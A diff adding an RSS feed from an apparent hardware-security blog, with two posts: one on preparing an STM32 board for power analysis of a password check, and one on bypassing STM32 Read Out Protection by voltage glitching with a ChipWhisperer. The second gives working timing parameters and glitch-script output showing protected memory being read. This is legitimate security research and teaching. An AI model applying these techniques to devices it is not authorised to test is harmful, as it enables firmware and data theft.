@@ -1,0 +1,775 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><?xml-stylesheet href="/feed_style.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="https://www.rssboard.org/media-rss">
+  <channel>
+    <title>Iot on giggi0x00hub</title>
+    <link>https://giggi0x00.github.io/tags/iot/</link>
+    <description>Recent content in Iot on giggi0x00hub</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>Luigi Fragale - [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).</copyright>
+    <lastBuildDate>Sat, 30 Nov 2024 09:42:43 +0100</lastBuildDate><atom:link href="https://giggi0x00.github.io/tags/iot/index.xml" rel="self" type="application/rss+xml" /><icon>https://giggi0x00.github.io/logo.svg</icon>
+    
+    
+    <item>
+      <title>Prepare an IoT devices for Power Analysis and Fault Injection</title>
+      <link>https://giggi0x00.github.io/posts/prepare-for-powernalaysis/</link>
+      <pubDate>Sat, 30 Nov 2024 09:42:43 +0100</pubDate>
+      
+      <guid>https://giggi0x00.github.io/posts/prepare-for-powernalaysis/</guid>
+      <description><![CDATA[<p>The purpose of this blog post is to provide a guide on how to prepare a device for fault injection and power analysis attacks. While many blogs focus solely on explaining these attacks, they often overlook the critical preparation phase. We want to showcase a simple hardware modification (but very effective) that will make the attacks to be successful. Within this blog post we will use a classic STM32 development board to demonstrate how to make it susceptible to such attacks.</p>
+<h3 id="what-is-power-analysis">What is Power analysis</h3>
+<p>In a nutshell, power analysis attack falls into the category of side channel attacks, where, any emission of the electronic target under analysis can be turned to a powerful source of information. As implied by the name <code>Power Analysis</code> consists in analyzing the power consumption of the target while performing normal operations.
+For example, imagine the following piece of code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">checkpassoword</span>(<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>buffer) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> res <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">strcmp</span>(sPassword, buffer);
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (res <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#50fa7b">unlock_the_secret_garden</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">//do_nothing..
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">return</span> <span style="color:#bd93f9">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>It is quite clear that if the password is correct the target will go through an extra set of instructions before returning, meaning that the power consumption will be higher. We want to spot these differences and understand the code paths and instructions being executed. This can be seen also to a transistor level, where there is a correlation between the power consumption and the operations that device is performing. It is therefore important to ensure that the power consumption associated with each action is accurately measured and free from interference. By &ldquo;free from interference,&rdquo; we mean that no additional factors are artificially increasing or decreasing the power used by the device during the analysis.
+The smallest fluctuations in consumption at low levels need to be emphasized in order to achieve accurate results.</p>
+<p>The design of the IoT device, for instance, focuses on maintaining stability by ensuring that tasks and operations are consistently performed with  a stable and constant voltage output. Keeping factors such as digital levels, frequency fluctuations, and power consumption within a trustworthy power level. To achieve so, components like voltage regulator, capacitors, diodes, or transistors play a crucial role.</p>
+<p>In order to effectively attack an electronic device, it is crucial to understand its design, identify key components, and make necessary modifications as required.</p>
+<h3 id="target-of-our-journey">Target of our journey</h3>
+<p>One of the target of our journey is the STM 32 Nucleo-64 development board. The board is a low-cost development platform for STM32 microcontrollers, used for prototyping embedded systems, programming firmware, and expanding with peripherals through Arduino-compatible connectors. It supports debugging and testing via an integrated ST-LINK, and is popular for IoT, automation, and learning purposes. Thus, it was used as subject for our analysis.</p>
+<p>The components on the board are visible on both sides of the PCB:</p>
+<p><img src="/images/prepare-for-poweranalysis/front.jpeg" alt=""></p>
+<p><img src="/images/prepare-for-poweranalysis/back.jpeg" alt=""></p>
+<p>We aim to demonstrate a Simple Power Analysis (SPA) attack on this board. For this purpose, the board has been programmed with firmware designed to emulate a login prompt which grants access to the main device&rsquo;s functionalities.
+The prompt is accessible via the UART interface and the following can be observed in the terminal when a wrong password is typed:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo socat /dev/ttyUSB0,b115200,raw,echo<span style="color:#ff79c6">=</span>0,crnl -
+</span></span><span style="display:flex;"><span>Type your password to unlock the device:
+</span></span><span style="display:flex;"><span>AAAAAA
+</span></span><span style="display:flex;"><span>Access denied! 
+</span></span><span style="display:flex;"><span>Type your password to unlock the device:
+</span></span></code></pre></div><p><strong>The attack that will be carried out in order to circumvent this security defense is Simple Power Analysis. The objective is to measure the power consumption of the device while we send different passwords. Through a careful analysis will be possible to identify different cycles that a strcmp function will go through on each inputs</strong></p>
+<h3 id="preparation-of-the-target">Preparation of the target</h3>
+<p>[adding also where and how we tap there  why are and what we are measuring]</p>
+<p>We need to understand the PCB design, components, power lines, sources of randomness, potential security defenses, and any PCB components that could interfere with our attacks.</p>
+<p>First of all let&rsquo;s start by understand the power inputs line of the device. These can be easily identified by following the VCC power lines of our MCU and the available pins.</p>
+<p><img src="/images/prepare-for-poweranalysis/power-tracking-Page-2.drawio.png" alt=""></p>
+<p>The board has a publicly available datasheet; however, even without schematics, it is still possible to understand the power lines and make modifications in most cases. As we can see from the following schematic, there are many capacitors connected between the VCC and Ground. These capacitors, are meant to stabilize the power of the device, ensuring stability and normal execution conditions ( decoupling capacitor). For our purposes we can consider the the decoupling capacitor as if they are device’s local energy storage.</p>
+<p>First schematic, let&rsquo;s identify the capacitor based on what we have discussed earlier.</p>
+<p><img src="/images/prepare-for-poweranalysis/Pasted_image_20240928210141.png" alt=""></p>
+<p>Even without a schematic, these type of capacitors can be identified using a multimeter and a careful inspection of the PCB design.</p>
+<p>These capacitors were marked with yellow dots for identification.</p>
+<p><img src="/images/prepare-for-poweranalysis/power-tracking-Page-3.drawio_.png" alt=""></p>
+<p>However, we can see that other capacitors are still present on the board. These capacitors are related the power input in the following diagram. While we could also consider to remove them, it is possible to bypass the power circuit line using the JP6 connector and disconnect the power lines from the rest of the circuit. This will allow us to have VCC lines not affected by any electronic components, making possible power analysis possible.</p>
+<p><img src="/images/prepare-for-poweranalysis/Pasted_image_20240929035211.png" alt=""></p>
+<hr>
+<h4 id="hardware-modifications">Hardware modifications</h4>
+<p>The identified capacitors were disconnected from the board. As you can see from the following pictures only one pin was disconnected. The usage of soldering station or hot air gun could be very useful in these cases.</p>
+<p><img src="/images/prepare-for-poweranalysis/flipped-front.jpeg" alt=""></p>
+<p><img src="/images/prepare-for-poweranalysis/Pasted_image_20241007221540.png" alt=""></p>
+<hr>
+<h3 id="hardware-setup">Hardware setup</h3>
+<p><img src="/images/prepare-for-poweranalysis/hw_setup_drawio.png" alt=""></p>
+<p><strong>While preparing for the setup, always watch out for ground loop!!!</strong></p>
+<hr>
+<h3 id="time-to-attack-the-password-prompt">Time to attack the password prompt!</h3>
+<p>The board is now ready to be deeply analyzed for the power consumption, aiming to detect voltage fluctuations based on the execution cycles. The attack consists in attack one single byte of the password at the time.
+We can suppose that the device will compare the input with some value inside. This means that a routine like the following one could be implemented in the firmware:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">checkpassoword</span>(<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>buffer) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> res <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">strcmp</span>(sPassword, buffer);
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (res <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">//do something
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Without going to much into the detail of the attack, we can simply understand the attack based on the following calculations:</p>
+<p>Let&rsquo;s assume the correct value is <code>AMSDATA</code>.</p>
+<p>We provide the following two inputs: <code>AMSAAAA</code> and <code>AMDDDDD</code>. The <code>strcmp</code> function compares each byte sequentially and returns when a match is found or a mismatch occurs. This means that the more correct characters we provide, the more execution cycles <code>strcmp</code> will take to complete, leading to a more power consumption.</p>
+<p>To fully understand the value of the hardware analysis and the changes made to the board, some power traces were collected before the modifications were implemented</p>
+<p>The power traces correspond to the power measurements of the device while the inputs are being processed.</p>
+<p>Let&rsquo;s have a look at how the power traces look like:
+The power traces before the modification look quite homogeneous, except some random spikes. It is very difficult to identify changes in the pattern across multiple inputs.</p>
+<p><img src="/images/prepare-for-poweranalysis/no_difference_observded.png" alt=""></p>
+<p><img src="/images/prepare-for-poweranalysis/no_difference_observded2.png" alt=""></p>
+<p>The following traces were collected with all capacitors disconnected from the PCB. As you can see, we have similar patterns as before; however, there is a noticeable change in the original power trace that requires further inspection.</p>
+<p><img src="/images/prepare-for-poweranalysis/Figure_1.png" alt=""></p>
+<p>If we zoom into the beginning of the diagram, we can observe that the Red trace diverges significantly from the rest of the power traces.</p>
+<p><img src="/images/prepare-for-poweranalysis/c_char_red_diverges.png" alt=""></p>
+<p>Final attack will come in the following post&hellip; STAY TUNED!</p>
+]]></description>
+      
+    </item>
+    
+    
+    
+    <item>
+      <title>Bypass STM32 Read Out Protection (RDP)</title>
+      <link>https://giggi0x00.github.io/posts/stm32rdpbypass/</link>
+      <pubDate>Tue, 02 Jan 2024 09:42:43 +0100</pubDate>
+      
+      <guid>https://giggi0x00.github.io/posts/stm32rdpbypass/</guid>
+      <description><![CDATA[<p>In this blog post, I will cover all the steps I took to circumvent the Read Out protection mechanism. For those unfamiliar with this security measure deployed by ST to safeguard firmware and customer data, here is a brief explanation from their website:</p>
+<ul>
+<li><a href="https://www.st.com/resource/en/product_training/STM32F7_Security_Memories_Protections.pdf">https://www.st.com/resource/en/product_training/STM32F7_Security_Memories_Protections.pdf</a>:</li>
+</ul>
+<h3 id="read-out-protection">Read Out Protection</h3>
+<blockquote>
+<p>Readout Protection, or RDP is a global mechanism that prevents external read access to Flash memory, backup SRAM and registers. An external access can be gained by using a JTAG connector, a Serial Wire port or boot software embedded in SRAM. Three levels of RDP protection are defined from level 0, which offers no protection at all, to level 2 which has full and permanent protection. [&hellip;] When first RDP level, Level 0, is set, the device has no protection. All read or write operations (if no write protection is set) on the Flash memory or the backup SRAM are possible in all boot configurations (Flash user boot, debug or boot from RAM). Option bytes are also changeable in this level.</p>
+</blockquote>
+<p>RDP Levels :</p>
+<ul>
+<li>Level 0 is is the factory default level.</li>
+<li>In level 1, read protection is set for the Flash memory, the backup SRAM and the backup registers is set. In this level, protected memories are only accessible when booting from User Flash memory. Whenever a debugger access is detected or boot is not set to a Flash memory area, any access to the protected memories generates a system hard fault which blocks all code execution until the next power-on reset*</li>
+<li>In level 2, all protections from Level 1, plus no SWD/JTAG connection possible, no going back. RDP/WRP option bytes can no longer be changed.</li>
+</ul>
+<hr>
+<h3 id="stm32-bootloader">STM32 Bootloader</h3>
+<p>STM32 provides multiple options for accessing the flash memory. These protocols can be accessed either through the SWD interface or a built-in system bootloader, which is available in almost all STM32 devices at address <code>0x1FFF0000</code>. The system bootloader allows users to interact with the STM32 device using various protocols to perform operations such as programming, erasing, or reading memory sectors. The protocols available include SWD, SPI, UART, and others.</p>
+<p>Due to its simplicity, this discussion will focus on the UART protocol and how it interfaces with the bootloader.</p>
+<p>The following commands are accessible via the UART interface:</p>
+<p><img src="/images/stm32rdpbypass/usart_readmemory.png" alt=""></p>
+<p>Without any protection enabled, the read command (<code>0x11</code>) successfully retrieves 256 bytes from the specified page address. However, when Read Out protection is activated, this operation is rejected. To gain a deeper understanding of how this mechanism is implemented, the system bootloader was reverse-engineered.</p>
+<p>We can observe the commands being parsed in the following screenshot:</p>
+<p><img src="/images/stm32rdpbypass/ghidra1.png" alt=""></p>
+<p>The function proceeds by checking for the presence of the Read Out Protection mechanism:</p>
+<p><img src="/images/stm32rdpbypass/ghidra2.png" alt=""></p>
+<p>This was verified by observing the value read just before the operation. The highlighted address, <code>0x400023C14</code>, confirms that the system checks the status of the Read Out Protection mechanism.</p>
+<p><img src="/images/stm32rdpbypass/ghidra3.png" alt=""></p>
+<p>It becomes evident that, to gain access to the flash memory, the highlighted <code>IF</code> statement must be targeted for a fault injection attack.</p>
+<hr>
+<h3 id="environment-setup">Environment Setup</h3>
+<p>The environment consists of the following devices and tools:</p>
+<ul>
+<li>STM32F401CC developer board</li>
+<li>CW1173 ChipWhisperer-Lite</li>
+<li>USB-UART TTL Converter</li>
+<li>ST Link programmer</li>
+</ul>
+<p>The device was programmed with a dummy firmware for testing and the Read Out Protection was set as shown in the following picture:</p>
+<p><img src="/images/stm32rdpbypass/setrdpbypass.png" alt=""></p>
+<p>Before proceeding with the attack, it is important to determine how and when to glitch the device. The chosen technique for this attack is <strong>Voltage Fault Injection</strong>, which involves briefly dropping the device&rsquo;s power supply just enough to cause it to skip instructions. Ideally, the glitch should occur precisely when the device is checking the Read Out Protection, resulting in either skipped instructions or a malformed data read.</p>
+<p>To generate an effective voltage injection, it is very important to carefully review the target device and remove any potential sources of disruption to the glitch, such as voltage regulators, bypass capacitors, and similar components. Additionally, understanding the power domain of the device is fundamental to identifying the optimal point for injecting the glitch.</p>
+<p><img src="/images/stm32rdpbypass/powersupply.png" alt="">
+<em>Power Supply schema</em></p>
+<p>As observed, all VDD voltage is routed through an internal voltage regulator within the SoC. However, the pins <strong>VCAP_1</strong> and <strong>VCAP_2</strong> are directly connected to the core power domain, making them ideal targets for the voltage injection.</p>
+<h3 id="hardware-preparation">Hardware Preparation</h3>
+<ul>
+<li>A cable was soldered at the VCAP_1</li>
+<li>The BOOT1 pin was manually forged to HIGH to have the device starting from the system bootloader at each reboot.</li>
+<li>USART interface connected to the USB-UART TTL Converted</li>
+<li>RESET pin connected to the Chipwhisperer TIO4</li>
+</ul>
+<p><img src="/images/stm32rdpbypass/diagram.png" alt=""></p>
+<p><em>IMPORTANT: The external UART-TTL Converter is important because Chipwhisperer does not support UART parity configuration.</em></p>
+<hr>
+<h3 id="execution">Execution</h3>
+<p>Once the hardware setup is properly configured, we are ready to determine the optimal glitch parameters.</p>
+<p>However, before targeting the Read Out Protection function within the Bootloader, it is important to identify the minimum glitch settings required to induce a successful fault and cause the device to skip instructions. A simple routine like the one below can serve as a starting point:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>[...]
+</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">for</span> (i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">1000</span>; i<span style="color:#ff79c6">++</span>) {
+</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">for</span> (j <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; j <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">1000</span>; j<span style="color:#ff79c6">++</span>) {
+</span></span><span style="display:flex;"><span>				k<span style="color:#ff79c6">++</span>;
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">print</span>(i,k,j)
+</span></span><span style="display:flex;"><span>        [...]
+</span></span></code></pre></div><p>This routine allows us to experiment with different glitch parameters and observe the effects, helping us fine-tune the settings for successful fault injection.</p>
+<p>Identified, the parameters, <code>repeat</code>, <code>width</code>, <code>offset</code>, and <code>clock frequency</code>, we can proceed with the attack. For this particular attack, we will use the <code>enable_only</code> setting, which focuses solely on the <code>repeat</code> value and the frequency. The length of the glitch is calculated as <code>1/clkfreq * repeat</code>. Another important parameter to consider is the <code>ext_offset</code>.
+This value defines the waiting period before initiating the glitch and is expressed in clock cycles as <code>1/clkfreq</code>. During the attack, this parameter introduced several issues, which will be explained in more detail below.</p>
+<p>To trigger the glitch immediately after the <code>0x11</code> read command is issued, the Chipwhisperer trigger pin was connected to the <code>USART_TX</code> line. However, we still need to determine the exact waiting time before initiating the glitch to ensure it occurs at the correct moment.</p>
+<hr>
+<h4 id="determine-the-ext_offset">Determine the ext_offset</h4>
+<p>A logic analyzer was used to determine how long the command takes before being received. The logic analyzer software provides a measurement feature that is particularly useful in this case. This feature allows precise timing measurements of when the 0x11 command is transmitted and received</p>
+<p><em>Uart commands</em>:</p>
+<p><img src="/images/stm32rdpbypass/uart_commands.png" alt="">
+<em>Example of Bootloader interactions</em></p>
+<p><img src="/images/stm32rdpbypass/ext_offset_estimation.png" alt="">
+<em>UART timing measurement</em></p>
+<p>Different measures were taken resulting in the following estimation:</p>
+<ul>
+<li>Command issue:  <code>182.300 µs</code></li>
+<li>Command response: <code>196.800 µs</code></li>
+</ul>
+<p>We can conclude the minimum waiting time to issue a glitch can be calculate as following:</p>
+<ul>
+<li>Clock cycle: <code>1/clkfreq== 10ns</code></li>
+<li>Minimum Waiting time: <code>182300/10 = 18230 clock cycle.</code></li>
+</ul>
+<p><code>ext_offset == number of clock cycles before issuing the glitch</code></p>
+<h3 id="glitch-session">Glitch Session</h3>
+<p>The initial run using a wide ext_offset range of 18230 to 19500 resulted in several responses. After analyzing the results, I determined that the glitch was causing both the Read-Out Protection and Write Protect features to have random values, resulting in a malformed environment.</p>
+<p><img src="/images/stm32rdpbypass/pcropsetwithglitch.png" alt=""></p>
+<p>After several sessions of fine-tuning and adjustments, the valid ext_offset parameter was found to be between <code>18300</code> and <code>18370</code>.
+The script can now run:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 glitchstm32f401.py 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cwlite Device
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">sn</span>         <span style="color:#ff79c6">=</span> 50203220594a48303230353137303033
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">fw_version</span> <span style="color:#ff79c6">=</span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">major</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">minor</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">65</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">debug</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">gain</span> <span style="color:#ff79c6">=</span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">mode</span> <span style="color:#ff79c6">=</span> high
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">gain</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">30</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">db</span>   <span style="color:#ff79c6">=</span> 24.8359375
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">adc</span> <span style="color:#ff79c6">=</span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">state</span>          <span style="color:#ff79c6">=</span> True
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">basic_mode</span>     <span style="color:#ff79c6">=</span> rising_edge
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">timeout</span>        <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">2</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">offset</span>         <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">presamples</span>     <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">samples</span>        <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">5000</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">decimate</span>       <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">trig_count</span>     <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">433471489</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">fifo_fill_mode</span> <span style="color:#ff79c6">=</span> normal
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">clock</span> <span style="color:#ff79c6">=</span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">adc_src</span>       <span style="color:#ff79c6">=</span> clkgen_x4
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">adc_phase</span>     <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">adc_freq</span>      <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">29538459</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">adc_rate</span>      <span style="color:#ff79c6">=</span> 29538459.0
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">adc_locked</span>    <span style="color:#ff79c6">=</span> True
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">freq_ctr</span>      <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">freq_ctr_src</span>  <span style="color:#ff79c6">=</span> extclk
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">clkgen_src</span>    <span style="color:#ff79c6">=</span> system
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">extclk_freq</span>   <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">10000000</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">clkgen_mul</span>    <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">25</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">clkgen_div</span>    <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">24</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">clkgen_freq</span>   <span style="color:#ff79c6">=</span> 100000000.0
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">clkgen_locked</span> <span style="color:#ff79c6">=</span> True
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">trigger</span> <span style="color:#ff79c6">=</span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">triggers</span> <span style="color:#ff79c6">=</span> tio4
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">module</span>   <span style="color:#ff79c6">=</span> basic
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">io</span> <span style="color:#ff79c6">=</span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">tio1</span>         <span style="color:#ff79c6">=</span> serial_tx
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">tio2</span>         <span style="color:#ff79c6">=</span> serial_rx
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">tio3</span>         <span style="color:#ff79c6">=</span> high_z
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">tio4</span>         <span style="color:#ff79c6">=</span> high_z
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">pdid</span>         <span style="color:#ff79c6">=</span> high_z
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">pdic</span>         <span style="color:#ff79c6">=</span> high_z
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">nrst</span>         <span style="color:#ff79c6">=</span> high_z
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">glitch_hp</span>    <span style="color:#ff79c6">=</span> True
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">glitch_lp</span>    <span style="color:#ff79c6">=</span> True
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">extclk_src</span>   <span style="color:#ff79c6">=</span> hs1
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">hs2</span>          <span style="color:#ff79c6">=</span> clkgen
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">target_pwr</span>   <span style="color:#ff79c6">=</span> True
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">tio_states</span>   <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>1, 0, 1, 1<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">cdc_settings</span> <span style="color:#ff79c6">=</span> bytearray<span style="color:#ff79c6">(</span>b<span style="color:#f1fa8c">&#39;\x00\x00\x00\x00&#39;</span><span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">glitch</span> <span style="color:#ff79c6">=</span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">clk_src</span>     <span style="color:#ff79c6">=</span> clkgen
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">mmcm_locked</span> <span style="color:#ff79c6">=</span> True
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">width</span>       <span style="color:#ff79c6">=</span> 10.15625
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">width_fine</span>  <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">offset</span>      <span style="color:#ff79c6">=</span> 10.15625
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">offset_fine</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">trigger_src</span> <span style="color:#ff79c6">=</span> ext_single
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">arm_timing</span>  <span style="color:#ff79c6">=</span> after_scope
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">ext_offset</span>  <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">repeat</span>      <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">output</span>      <span style="color:#ff79c6">=</span> enable_only
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18327</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134217728 <span style="color:#bd93f9">0800000008</span>
+</span></span><span style="display:flex;"><span>Result 1f1f
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18331</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134217728 <span style="color:#bd93f9">0800000008</span>
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: <span style="color:#bd93f9">0800000008</span>
